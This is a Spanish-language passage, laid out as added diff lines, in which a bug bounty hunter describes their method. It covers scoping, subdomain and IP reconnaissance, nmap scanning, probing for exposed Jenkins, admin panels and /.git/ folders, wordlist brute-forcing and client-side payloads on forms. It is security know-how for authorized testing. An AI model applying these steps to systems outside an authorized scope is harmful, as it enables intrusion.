+Para los programas de recompensas por errores, primero revisaré el alcance del objetivo. Hay una gran diferencia entre un alcance como *.facebook.com y el entorno de pruebas de una aplicación única de una pequeña empresa.
+
+Si el alcance es amplio, aceptan solicitudes para cualquiera de sus servidores. Voy a empezar a realizar un reconocimiento con motores de búsqueda como Google, Shodan, Censys, ARIN, etc., para descubrir subdominios, endpoints y direcciones IP de servidores. Esto combina Google Dorking, escaneo de rangos de IP de empresas, escaneo de puertos de servidores, etc. Cualquier cosa que me proporcione información sobre servidores que puedan pertenecer a esa empresa.
+
+Cuando tengo una lista de servidores, empiezo a realizar un escaneo de puertos y banners de nmap para ver qué tipo de servidores se están ejecutando. No olvides anotar todo lo que hagas. Podrías encontrar algunos hallazgos rápidos, como puertos SSH abiertos que permiten la autenticación con contraseña. En este punto, tiendo a evitar reportar estos problemas menores. Dedico más tiempo a buscar aplicaciones críticas que se ejecutan en puertos web no estándar, como Jenkins, que pueden tener una configuración predeterminada débil o carecer de autenticación.
+
+Antes de profundizar demasiado en los sitios web, primero hago un recorrido rápido por los servidores web en busca de aplicaciones comunes como WordPress, Drupal, Joomla, etc. Esto combina la exploración manual de los sitios o la búsqueda de directorios mediante listas de palabras, mapas del sitio, robots.txt, etc. Busco errores fáciles de detectar o superficiales. No tiene sentido centrar los esfuerzos en ellos, pero es muy útil realizar un seguimiento. Entiendo el flujo de trabajo y las solicitudes de las aplicaciones mediante una herramienta proxy como Burp o Zap.
+
+Luego, ingrese al sitio web, verifique cada solicitud y respuesta y analice; estoy tratando de comprender su infraestructura, por ejemplo, cómo manejan las sesiones/autenticación, qué tipo de protección CSRF tienen (si corresponde).
+
+A veces utilizo pruebas negativas a través del error. Esta información me resulta muy útil para encontrar rutas internas del sitio web. Dedico la mayor parte del tiempo a comprender el flujo de la aplicación para comprender mejor qué tipo de vulnerabilidades buscar.
+
+Una vez hecho todo esto, dependiendo de las reglas del programa, empezaré a analizar el uso de scripts para forzar la búsqueda de listas de palabras en endpoints. Esto puede ayudar a encontrar nuevos directorios o carpetas que quizás no se hayan podido encontrar usando el sitio web. Suelen ser paneles de administración privados, repositorios de código fuente que se olvidaron de eliminar, como las carpetas /.git/, o scripts de prueba y depuración. Tras esta comprobación, cada formulario del sitio web intenta enviar ataques del lado del cliente. Se utilizan múltiples cargas útiles para eludir los filtros del lado del cliente. La mejor herramienta para la búsqueda de recompensas por errores es "BURP SUITE".
+
